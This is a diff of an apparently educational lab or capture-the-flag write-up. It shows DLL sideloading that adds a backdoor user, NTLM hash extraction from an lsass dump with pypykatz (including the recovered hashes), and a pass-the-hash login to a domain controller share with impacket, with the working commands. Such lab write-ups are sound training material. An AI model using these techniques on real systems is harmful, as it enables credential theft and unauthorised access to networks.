@@ -151,3 +151,98 @@ If there is no entry in the resulting list, stopping and restarting the service 
 As `sspicli.dll` has been successfully used for DLL sideloading in the past, https://hijacklibs.net/entries/microsoft/built-in/sspicli.html, `mylib.dll` is copied into `C:\CCD\easyftpsvr-1.7.0.2` as `SspiCli.dll`. After stopping and restarting the server, `net user` displays the `BackDoorUser` which was installed when the DLL was loaded.
 
 ![BackDoorUser](BackDoorUser.png)
+
+## DUMP
+
+>A previous attack escalated privileges on a user’s Computer and created a process dump of the lsass process (attached below, lsass.zip).
+>
+>The passwords and password hashes are stored in the Security Support Providers's memory. Recover usable passwords and password hashes from the process dump. The goal is to recover the NTLM password hash (no VPN needed).
+>
+>Hints Windows:
+>
+>    mimikatz # sekurlsa::minidump
+>
+>Hints Linux:
+>
+>    Pypykatz minidump https://github.com/skelsec/pypykatz
+
+### Setup of Analysis System
+
+For the subsequent analysis steps, a Kali VM was installed in VirtualBox.
+
+The following Kali image is used:
+[https://cdimage.kali.org/kali-2025.3/kali-linux-2025.3-virtualbox-amd64.7z](https://cdimage.kali.org/kali-2025.3/kali-linux-2025.3-virtualbox-amd64.7z)  
+
+A virtual environment for pypykatz is created by `python3 -m venv ./venv` and started by `. ./venv/bin/activate`. pypykatz is then installed via `pip3 install pypykatz`. In the next step mimikatz is used to create a parseable credentials dump out of the extracted LSA dump. The credentials dump is then put into a filter to produce the relevant outputs, i.e. domain name, user name, and NTLM hash:
+
+```zsh
+pypykatz lsa minidump lsass.DMP --grep -o credentials.txt
+cat credentials.txt | sed -E 's/[^:]*:([^:]*):([^:]*):([^:]*).*:.*/\1,\2,\3/' | grep -vE "^," | grep -vE ",$"
+```
+
+This returns the following NTLM hashes:
+
+|domain|user|NTLM Hash|
+|-|-|-|
+|winctf|monitoring|2785d316dd37ca24ebb855fcf054c74a|
+|ap321|admin_laps|b49674ecf0ac6dcc0169c6e0e99c726d|
+|Window Manager|DWM-2|e90ad219309a589cce444685cfc2165a|
+|Font Driver Host|UMFD-2|e90ad219309a589cce444685cfc2165a|
+|Window Manager|DWM-1|e90ad219309a589cce444685cfc2165a|
+|WORKGROUP|ap321$|e90ad219309a589cce444685cfc2165a|
+|Font Driver Host|UMFD-0|e90ad219309a589cce444685cfc2165a|
+|Font Driver Host|UMFD-1|e90ad219309a589cce444685cfc2165a|
+
+The accounts `monitoring`, `admin_laps` are candidates for trying to login subsequently.
+
+## PTH
+>You extracted credentials of the “monitoring” user. This user has access to a monitoring share on the domain controller. Find a way to access it - it seems the password is not available. The target share is “monitoring” on the domain controller. The flag is in flag.txt. 
+>
+>The Domain controller is accessible via VPN at 192.168.10.162.
+>
+>Hints Windows:
+>
+>    mimikatz sekurlsa::pth
+>
+>Hints Linux:
+>
+>    smbclient.py
+
+
+Using 
+- the provided password for the account `its26eschwaig`, 
+- the vpn configuration file obtained at the SOPHOS portal and 
+- the Kali `openvpn` client,
+
+a vpn connection is set up as follows:
+
+```zsh
+sudo openvpn --config sslvpn-its26eschwaig-client-config.ovpn
+```
+
+Once the connection is set up, the SMB server `192.168.10.162` becomes available. In the virtual environment created in the previous step, the `smbclient.py` script is downloaded from `https://github.com/fortra/impacket/blob/master/examples/smbclient.py`. Running the script gives an error indicating that `impacket` needs to be installed. This is done in the virtual environment via `pip3 install impacket`.
+
+Invoking `smbclient.py` still gives an error, this time directly in the python module itself, on line 71:
+
+```zsh
+./smbclient.py -hashes :2785d316dd37ca24ebb855fcf054c74a -target-ip 192.168.10.162  winctf/monitoring
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Traceback (most recent call last):
+  File "/home/kali/projects/CCD/./impacket/examples/smbclient.py", line 126, in <module>
+    main()
+    ~~~~^^
+  File "/home/kali/projects/CCD/./impacket/examples/smbclient.py", line 71, in main
+    logger.init(options.ts, options.debug)
+    ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: init() takes from 0 to 1 positional arguments but 2 were given
+```
+
+by fixing the script like so
+```py
+    #logger.init(options.ts, options.debug)
+    logger.init(options.ts)
+```
+and running the script again, the `monitoring` share becomes available. Opening it and looking into the content of `flag.txt` reveals the flag:
+
+![SMB_Connect_Flag](SMB_Connect_Flag.png)
